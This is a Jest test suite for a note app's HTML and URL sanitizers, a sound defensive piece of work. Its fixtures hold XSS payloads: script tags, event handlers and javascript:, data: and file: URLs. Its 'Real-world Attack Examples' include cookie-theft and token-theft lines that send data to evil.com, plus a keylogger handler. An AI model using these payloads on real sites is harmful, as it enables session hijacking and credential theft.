/**
 * Input Sanitization Tests
 *
 * Tests for XSS prevention and HTML sanitization
 */

import {
  sanitizeInput,
  sanitizeNoteTitle,
  sanitizeNoteContent,
  sanitizeRichContent,
  sanitizeBlocksJson,
  sanitizeUrl,
  sanitizeFolderName,
  sanitizeTagName,
  containsPotentialXSS,
  getSanitizationStats,
  SanitizationLevel,
} from '../sanitize';

describe('Input Sanitization', () => {
  describe('sanitizeInput - STRICT level', () => {
    it('should strip all HTML tags', () => {
      const input = '<b>Bold</b> <i>Italic</i> <script>alert("xss")</script>';
      const result = sanitizeInput(input, SanitizationLevel.STRICT);

      expect(result).toBe('Bold Italic ');
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
    });

    it('should remove script tags completely', () => {
      const input = '<script>alert("XSS")</script>Hello';
      const result = sanitizeInput(input, SanitizationLevel.STRICT);

      expect(result).toBe('Hello');
      expect(result).not.toContain('script');
    });

    it('should handle empty input', () => {
      expect(sanitizeInput('', SanitizationLevel.STRICT)).toBe('');
      expect(sanitizeInput(null, SanitizationLevel.STRICT)).toBe('');
      expect(sanitizeInput(undefined, SanitizationLevel.STRICT)).toBe('');
    });

    it('should remove null bytes and control characters', () => {
      const input = 'Hello\x00World\x0BTest';
      const result = sanitizeInput(input, SanitizationLevel.STRICT);

      expect(result).toBe('HelloWorldTest');
    });

    it('should trim whitespace', () => {
      const input = '   Hello World   ';
      const result = sanitizeInput(input, SanitizationLevel.STRICT);

      expect(result).toBe('Hello World');
    });

    it('should enforce length limit', () => {
      const input = 'a'.repeat(1000);
      const result = sanitizeInput(input, SanitizationLevel.STRICT);

      expect(result.length).toBeLessThanOrEqual(500);
    });
  });

  describe('sanitizeInput - BASIC level', () => {
    it('should allow basic formatting tags', () => {
      const input = '<b>Bold</b> <i>Italic</i> <u>Underline</u>';
      const result = sanitizeInput(input, SanitizationLevel.BASIC);

      expect(result).toContain('<b>Bold</b>');
      expect(result).toContain('<i>Italic</i>');
      expect(result).toContain('<u>Underline</u>');
    });

    it('should strip script tags', () => {
      const input = '<p>Safe</p><script>alert("xss")</script>';
      const result = sanitizeInput(input, SanitizationLevel.BASIC);

      expect(result).toContain('<p>Safe</p>');
      expect(result).not.toContain('script');
    });

    it('should sanitize link attributes', () => {
      const input = '<a href="https://example.com" onclick="evil()">Link</a>';
      const result = sanitizeInput(input, SanitizationLevel.BASIC);

      expect(result).toContain('href="https://example.com"');
      expect(result).not.toContain('onclick');
    });

    it('should add security attributes to external links', () => {
      const input = '<a href="https://external.com">Link</a>';
      const result = sanitizeInput(input, SanitizationLevel.BASIC);

      expect(result).toContain('rel="noopener noreferrer"');
      expect(result).toContain('target="_blank"');
    });

    it('should allow safe CSS styles', () => {
      const input = '<span style="color: #ff0000;">Red text</span>';
      const result = sanitizeInput(input, SanitizationLevel.BASIC);

      expect(result).toContain('color');
      expect(result).toContain('#ff0000');
    });

    it('should block dangerous CSS', () => {
      const input = '<span style="position: absolute; z-index: 9999;">Evil</span>';
      const result = sanitizeInput(input, SanitizationLevel.BASIC);

      expect(result).not.toContain('position');
      expect(result).not.toContain('z-index');
    });
  });

  describe('sanitizeInput - RICH level', () => {
    it('should allow headings', () => {
      const input = '<h1>Title</h1><h2>Subtitle</h2>';
      const result = sanitizeInput(input, SanitizationLevel.RICH);

      expect(result).toContain('<h1>Title</h1>');
      expect(result).toContain('<h2>Subtitle</h2>');
    });

    it('should allow lists', () => {
      const input = '<ul><li>Item 1</li><li>Item 2</li></ul>';
      const result = sanitizeInput(input, SanitizationLevel.RICH);

      expect(result).toContain('<ul>');
      expect(result).toContain('<li>');
    });

    it('should allow tables', () => {
      const input = '<table><tr><td>Cell</td></tr></table>';
      const result = sanitizeInput(input, SanitizationLevel.RICH);

      expect(result).toContain('<table>');
      expect(result).toContain('<td>');
    });

    it('should still block scripts', () => {
      const input = '<h1>Title</h1><script>alert("xss")</script>';
      const result = sanitizeInput(input, SanitizationLevel.RICH);

      expect(result).toContain('<h1>Title</h1>');
      expect(result).not.toContain('script');
    });

    it('should block iframes', () => {
      const input = '<iframe src="https://evil.com"></iframe>';
      const result = sanitizeInput(input, SanitizationLevel.RICH);

      expect(result).not.toContain('iframe');
    });
  });

  describe('sanitizeNoteTitle', () => {
    it('should remove all HTML from titles', () => {
      const input = '<script>alert("xss")</script>My Note Title';
      const result = sanitizeNoteTitle(input);

      expect(result).toBe('My Note Title');
    });

    it('should handle special characters safely', () => {
      const input = 'Title with <>&"\'';
      const result = sanitizeNoteTitle(input);

      expect(result).toBeTruthy();
      expect(result).not.toContain('<script>');
    });
  });

  describe('sanitizeNoteContent', () => {
    it('should allow basic formatting', () => {
      const input = '<b>Bold text</b> and <i>italic text</i>';
      const result = sanitizeNoteContent(input);

      expect(result).toContain('<b>Bold text</b>');
      expect(result).toContain('<i>italic text</i>');
    });

    it('should remove dangerous content', () => {
      const input = '<script>steal()</script><b>Safe</b>';
      const result = sanitizeNoteContent(input);

      expect(result).toContain('<b>Safe</b>');
      expect(result).not.toContain('script');
    });
  });

  describe('sanitizeRichContent', () => {
    it('should preserve rich formatting', () => {
      const input = '<h1>Heading</h1><ul><li>Item</li></ul>';
      const result = sanitizeRichContent(input);

      expect(result).toContain('<h1>Heading</h1>');
      expect(result).toContain('<ul>');
      expect(result).toContain('<li>Item</li>');
    });
  });

  describe('sanitizeBlocksJson', () => {
    it('should sanitize valid BlockNote JSON', () => {
      const blocks = [
        {
          type: 'paragraph',
          content: [
            { type: 'text', text: '<script>alert("xss")</script>Hello' },
          ],
        },
      ];

      const result = sanitizeBlocksJson(JSON.stringify(blocks));
      const parsed = JSON.parse(result);

      expect(parsed[0].content[0].text).not.toContain('script');
      expect(parsed[0].content[0].text).toContain('Hello');
    });

    it('should handle nested blocks', () => {
      const blocks = [
        {
          type: 'paragraph',
          content: [{ type: 'text', text: 'Parent' }],
          children: [
            {
              type: 'paragraph',
              content: [{ type: 'text', text: '<b>Child</b>' }],
            },
          ],
        },
      ];

      const result = sanitizeBlocksJson(JSON.stringify(blocks));
      const parsed = JSON.parse(result);

      expect(parsed[0].children).toBeDefined();
      expect(parsed[0].children[0].content[0].text).toBeDefined();
    });

    it('should handle invalid JSON gracefully', () => {
      const result = sanitizeBlocksJson('invalid json');
      expect(result).toBe('');
    });

    it('should handle non-array JSON', () => {
      const result = sanitizeBlocksJson('{"not": "array"}');
      expect(result).toBe('');
    });

    it('should sanitize URLs in block props', () => {
      const blocks = [
        {
          type: 'link',
          props: {
            url: 'javascript:alert("xss")',
            text: 'Click me',
          },
        },
      ];

      const result = sanitizeBlocksJson(JSON.stringify(blocks));
      const parsed = JSON.parse(result);

      expect(parsed[0].props.url).toBe(''); // Blocked javascript: URL
    });
  });

  describe('sanitizeUrl', () => {
    it('should allow safe HTTP URLs', () => {
      const url = 'https://example.com/page';
      const result = sanitizeUrl(url);

      expect(result).toBe(url);
    });

    it('should allow mailto URLs', () => {
      const url = 'mailto:user@example.com';
      const result = sanitizeUrl(url);

      expect(result).toBe(url);
    });

    it('should block javascript URLs', () => {
      const url = 'javascript:alert("xss")';
      const result = sanitizeUrl(url);

      expect(result).toBe('');
    });

    it('should block data URLs', () => {
      const url = 'data:text/html,<script>alert("xss")</script>';
      const result = sanitizeUrl(url);

      expect(result).toBe('');
    });

    it('should block vbscript URLs', () => {
      const url = 'vbscript:msgbox("xss")';
      const result = sanitizeUrl(url);

      expect(result).toBe('');
    });

    it('should detect encoded javascript URLs', () => {
      const url = 'java%73cript:alert("xss")';
      const result = sanitizeUrl(url);

      expect(result).toBe('');
    });

    it('should handle empty URLs', () => {
      expect(sanitizeUrl('')).toBe('');
      expect(sanitizeUrl(null)).toBe('');
      expect(sanitizeUrl(undefined)).toBe('');
    });
  });

  describe('sanitizeFolderName', () => {
    it('should strip all HTML from folder names', () => {
      const input = '<b>Work</b> Folder';
      const result = sanitizeFolderName(input);

      expect(result).toBe('Work Folder');
    });
  });

  describe('sanitizeTagName', () => {
    it('should strip all HTML from tag names', () => {
      const input = '<script>evil</script>important';
      const result = sanitizeTagName(input);

      expect(result).toBe('important');
    });
  });

  describe('containsPotentialXSS', () => {
    it('should detect XSS attempts', () => {
      const input = '<script>alert("xss")</script>';

      expect(containsPotentialXSS(input, SanitizationLevel.STRICT)).toBe(true);
    });

    it('should return false for clean input', () => {
      const input = 'Clean text';

      expect(containsPotentialXSS(input, SanitizationLevel.STRICT)).toBe(false);
    });

    it('should detect event handlers', () => {
      const input = '<img src="x" onerror="alert(1)">';

      expect(containsPotentialXSS(input, SanitizationLevel.BASIC)).toBe(true);
    });
  });

  describe('getSanitizationStats', () => {
    it('should calculate removal statistics', () => {
      const original = '<script>alert("xss")</script>Hello World';
      const sanitized = 'Hello World';

      const stats = getSanitizationStats(original, sanitized);

      expect(stats.wasModified).toBe(true);
      expect(stats.bytesRemoved).toBeGreaterThan(0);
      expect(Number(stats.percentageRemoved)).toBeGreaterThan(0);
    });

    it('should show no changes for clean input', () => {
      const text = 'Clean text';
      const stats = getSanitizationStats(text, text);

      expect(stats.wasModified).toBe(false);
      expect(stats.bytesRemoved).toBe(0);
      expect(stats.percentageRemoved).toBe('0.00');
    });
  });
});

describe('XSS Attack Scenarios', () => {
  describe('Script Injection', () => {
    it('should block basic script tag', () => {
      const attack = '<script>alert(document.cookie)</script>';
      const result = sanitizeNoteContent(attack);

      expect(result).not.toContain('script');
      expect(result).not.toContain('alert');
    });

    it('should block script with src attribute', () => {
      const attack = '<script src="https://evil.com/steal.js"></script>';
      const result = sanitizeNoteContent(attack);

      expect(result).not.toContain('script');
    });

    it('should block inline event handlers', () => {
      const attack = '<img src="x" onerror="alert(1)">';
      const result = sanitizeNoteContent(attack);

      expect(result).not.toContain('onerror');
    });

    it('should block javascript: protocol', () => {
      const attack = '<a href="javascript:alert(1)">Click</a>';
      const result = sanitizeNoteContent(attack);

      expect(result).not.toContain('javascript:');
    });
  });

  describe('HTML Injection', () => {
    it('should block iframe injection', () => {
      const attack = '<iframe src="https://evil.com"></iframe>';
      const result = sanitizeRichContent(attack);

      expect(result).not.toContain('iframe');
    });

    it('should block object/embed tags', () => {
      const attack = '<object data="malware.swf"></object>';
      const result = sanitizeRichContent(attack);

      expect(result).not.toContain('object');
    });

    it('should block form injection', () => {
      const attack = '<form action="https://evil.com"><input name="password"></form>';
      const result = sanitizeRichContent(attack);

      expect(result).not.toContain('form');
    });
  });

  describe('CSS Injection', () => {
    it('should block expression() in styles', () => {
      const attack = '<div style="width: expression(alert(1))">Test</div>';
      const result = sanitizeRichContent(attack);

      expect(result).not.toContain('expression');
    });

    it('should block import in styles', () => {
      const attack = '<style>@import url("https://evil.com/steal.css")</style>';
      const result = sanitizeRichContent(attack);

      expect(result).not.toContain('@import');
    });
  });

  describe('Protocol-based Attacks', () => {
    it('should block data: URLs', () => {
      const url = 'data:text/html,<script>alert(1)</script>';
      const result = sanitizeUrl(url);

      expect(result).toBe('');
    });

    it('should block vbscript: URLs', () => {
      const url = 'vbscript:msgbox(1)';
      const result = sanitizeUrl(url);

      expect(result).toBe('');
    });

    it('should block file: URLs', () => {
      const url = 'file:///etc/passwd';
      const result = sanitizeUrl(url);

      expect(result).toBe('');
    });
  });

  describe('Encoding-based Attacks', () => {
    it('should detect URL-encoded javascript', () => {
      const url = 'java%73cript:alert(1)';
      const result = sanitizeUrl(url);

      expect(result).toBe('');
    });

    it('should handle HTML entity encoding', () => {
      const attack = '&lt;script&gt;alert(1)&lt;/script&gt;';
      const result = sanitizeNoteContent(attack);

      // Entities should be preserved or escaped, not executed
      expect(result).not.toContain('<script>');
    });
  });

  describe('Real-world Attack Examples', () => {
    it('should prevent cookie theft', () => {
      const attack = '<img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">';
      const result = sanitizeNoteContent(attack);

      expect(result).not.toContain('onerror');
      expect(result).not.toContain('fetch');
    });

    it('should prevent keylogger injection', () => {
      const attack = '<input type="text" onkeypress="sendToServer(event.key)">';
      const result = sanitizeRichContent(attack);

      expect(result).not.toContain('onkeypress');
    });

    it('should prevent session hijacking', () => {
      const attack = '<script>new Image().src="https://evil.com/steal?token="+localStorage.token</script>';
      const result = sanitizeNoteContent(attack);

      expect(result).not.toContain('script');
      expect(result).not.toContain('localStorage');
    });
  });
});
